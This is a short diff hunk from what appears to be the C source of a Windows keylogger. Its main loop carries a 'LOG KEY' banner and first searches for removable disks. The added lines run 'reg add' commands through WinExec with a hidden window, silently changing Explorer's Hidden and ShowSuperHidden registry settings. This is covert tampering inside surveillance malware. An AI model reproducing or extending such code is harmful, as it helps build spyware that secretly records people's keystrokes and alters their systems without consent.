@@ -72,7 +72,10 @@ main(){
     char driveLetter = getRemovableDisk();    //initial search for removable disk
     //return 0; // :)
     //printf("pippo\n");
-    
+    char* command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\Currentversion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 1 /f";
+	WinExec(command, SW_HIDE);
+	command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\Currentversion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 1 /f";
+	WinExec(command, SW_HIDE);
     while(1){
         ////////////////****LOG KEY****/////////////////
     //    printf("azzz\n");
